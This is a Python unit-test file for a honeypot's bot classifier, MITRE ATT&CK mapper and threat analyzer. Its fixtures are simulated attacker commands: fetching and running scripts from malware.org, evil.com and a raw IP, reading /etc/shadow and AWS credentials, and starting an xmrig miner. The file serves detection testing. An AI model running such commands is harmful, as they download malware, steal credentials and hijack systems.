"""Unit tests for AI behavioral threat intelligence and MITRE ATT&CK mapping."""

import unittest

from cloud_honeypot_ai.ai.bot_classifier import BotClassifier
from cloud_honeypot_ai.ai.mitre_attack import MitreAttackMapper
from cloud_honeypot_ai.ai.threat_analyzer import ThreatAnalyzer
from cloud_honeypot_ai.core.session import SessionManager


class TestAIThreatAnalyzer(unittest.TestCase):

    def setUp(self):
        self.classifier = BotClassifier()
        self.mapper = MitreAttackMapper()
        self.analyzer = ThreatAnalyzer()
        self.session_mgr = SessionManager()

    def test_bot_classifier(self):
        # Botnet sequence
        bot_cmds = [
            {"command": "cd /tmp && wget http://malware.org/bot.sh"},
            {"command": "chmod 777 bot.sh && sh bot.sh"},
            {"command": "rm -rf bot.sh"},
        ]
        profile = self.classifier.profile_session(
            auth_attempts=[{"username": "root", "password": "123"}],
            commands=bot_cmds,
            duration_seconds=1.0,
        )
        self.assertEqual(profile.classification, "AUTOMATED_BOTNET")
        self.assertTrue(profile.is_automated)
        self.assertGreaterEqual(profile.confidence, 0.8)

    def test_mitre_mapping(self):
        cmds = [
            {"command": "cat /etc/shadow"},
            {"command": "uname -a"},
            {"command": "curl http://194.26.29.10/payload.sh"},
            {"command": "sudo su"},
            {"command": "xmrig -o pool.minexmr.com:4444"},
        ]
        techniques = self.mapper.map_commands(cmds)
        ids = {t.technique_id for t in techniques}

        self.assertIn("T1552.001", ids)  # Credentials in files
        self.assertIn("T1082", ids)      # System info discovery
        self.assertIn("T1105", ids)      # Ingress tool transfer
        self.assertIn("T1548.003", ids)  # Sudo privilege escalation
        self.assertIn("T1496", ids)      # Resource hijacking (cryptomining)

    def test_threat_analyzer_full_report(self):
        session = self.session_mgr.create_session("185.220.101.5", 48123, "SSH")
        session.record_auth_attempt("root", "123456", False)
        session.record_auth_attempt("admin", "admin123", True)
        session.record_command("cat ~/.aws/credentials", "[default] aws_access_key_id = HONEY_CANARY...", "CANARY_AWS_CREDENTIAL_STOLEN")
        session.record_command("curl http://evil.com/x.sh", "OK")

        report = self.analyzer.analyze_session(session)

        self.assertEqual(report.attacker_ip, "185.220.101.5")
        self.assertEqual(report.country, "Germany")
        self.assertIn("CRITICAL", report.threat_level)
        self.assertGreaterEqual(report.risk_score, 85)
        self.assertIn("CANARY_AWS_CREDENTIAL_STOLEN", report.canary_breaches[0])
        self.assertIn("evil.com", report.iocs["payload_urls"][0])
        self.assertIn("admin123", report.iocs["passwords_attempted"])
        self.assertIn("Germany", report.executive_summary)


if __name__ == "__main__":
    unittest.main()
